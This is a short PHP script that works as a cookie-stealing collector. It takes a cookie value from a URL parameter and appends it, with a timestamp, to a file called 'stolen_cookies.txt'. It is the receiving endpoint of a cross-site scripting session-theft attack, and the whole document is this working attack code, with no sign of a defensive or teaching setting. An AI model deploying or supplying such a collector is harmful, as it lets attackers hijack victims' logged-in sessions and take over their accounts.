<?php
$data = date("Y-m-d H:i:s") . " - Cookie: " . $_GET['c'] . "\n";
file_put_contents("stolen_cookies.txt", $data, FILE_APPEND);
?>
